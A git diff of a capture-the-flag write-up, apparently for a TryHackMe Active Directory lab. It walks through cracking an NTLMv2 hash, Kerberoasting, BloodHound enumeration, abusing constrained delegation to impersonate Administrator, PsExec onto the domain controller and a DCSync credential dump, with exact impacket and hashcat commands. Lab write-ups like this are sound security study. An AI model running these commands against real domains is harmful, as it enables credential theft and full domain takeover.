@@ -47,35 +47,56 @@ but it didn't trigger authentication
 
 ## Cracking the captured NTLMv2 hash:
 1. i saved the hash to hash.txt file
-2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force` 
+2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force`
+ 
 the password is: 1summerlove!
 
 
-[[Kerberoasting]]
+# Kerberoasting
 1. `impacket/GetUserSPNs.py ctf.local/svc.scanner -dc-ip 10.114.142.161 -request`
-	i got the TGS-REP blob for svc.mssql
-	![[Pasted image 20260827195245.png]]
+	I got the TGS-REP blob for svc.mssql
+
+	<img width="1912" height="802" alt="Pasted image 20260827195245" src="https://github.com/user-attachments/assets/9d5a5b25-0d61-48a6-a4e8-f86713d808d8" />
+
 	i tried to crack it using hashcat, but unfortunately, no results
 
-BloodHound
+# BloodHound
 1. collect information
 	`bloodhound-python -c all -u svc.scanner -p 1summerlove! -d ctf.local -ns 10.114.151.84 --zip`
 
 2. run bloodhound & import the zip file
-	`bloodhound-start`  login with admin admin
-	![[Screenshot 2026-08-28 024159.png]]
+	`bloodhound-start`  login with admin admin and upload the zip file
 
-We found that svc.scanner has "AllowedToDelegate" privilege over the DC "DC01.CTF.LOCAL" 
-[[AllowedToDelegate privilege]]: Allows you to impersonate another user and request a service ticket (TGS) on behalf of him.
-so we request a service ticket for CIFS (the service giving the DC file-system access)
 
-we found hints on how to exploit this "AllowedToDelegate execution privilege" in the Linux abuse tab:
-	![[Pasted image 20260828030627.png]]
-	we follow along and GG, this demonstrate the power of [[BloodHound]]
-	1. `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator'` 
-		-this will give us the TGS of cifs (the service controlling the DC's file-system) or in other words, Administrator TGT stored in a ccache file              IDK how   (:
-		-also note you need to edit /etc/resolv.conf or /etc/hosts for hostname resolution 
-	2. `export KRB5CCNAME=<path_to_ccache_file>`
+We found that svc.scanner has a constrained delegation relationship "AllowedToDelegate" with the domain controller
+<img width="1917" height="903" alt="Screenshot 2026-08-28 024159" src="https://github.com/user-attachments/assets/0b169dcc-c29e-4440-9d8e-dd0b866e4867" />
+
+
+# Exploitation   "Privilege Abuse"
+"AllowedToDelegate privilege": Allows you to impersonate another user and request a service ticket (TGS) on behalf of him.
+so we request a service ticket for CIFS as Administrator.                  CIFS is the service giving the DC file-system access
+
+
+1. Request a service ticket for CIFS impersonating Administrator 
+   `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator' -dc-ip <DC_IP>` 
+	          -this will give us the TGS for CIFS stored in a .ccache file
+   <img width="1247" height="222" alt="image" src="https://github.com/user-attachments/assets/a2496d9f-3d6d-4af1-89ea-1f9f71a9c815" />
+
+	
+3. we export the KRB5CCNAME to point to the .ccache file, in order to authenticate with this Kerberos ticket with subsequent tools
+   `export KRB5CCNAME=<path_to_ccache_file>`
 		
-	3. `impcket/psexec.py ctf.local/Administrator@DC01.CTG.LOCAL -k -no-pass`
-THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
+4. We used PsExec to authenticate to the DC as Administrator
+ `impcket/psexec.py ctf.local/Administrator@DC01.CTG.LOCAL -k -no-pass`
+-k: reads from the KRB5CCNAME environment variable
+we needed to specify the DC's hostname, because Kerberos relies on DNS hostname resolution
+<img width="863" height="335" alt="image" src="https://github.com/user-attachments/assets/3f2a0211-48a1-4a79-acdf-69b43de71d9e" />
+
+Now we navigate to the Administrator desktop and grab the flag
+
+
+# Going beyond the CTF
+we perform a DCSync Attack "dumping the DC's NTDS.dit database"
+   `impacket/secretsdump.py ctf.local/Administrator@DC01.CTF.LOCAL -k -no-pass -just-dc -output dc_dump`
+<img width="1150" height="747" alt="image" src="https://github.com/user-attachments/assets/5afd1cea-1dbb-4297-b60f-62fd80306851" />
+   
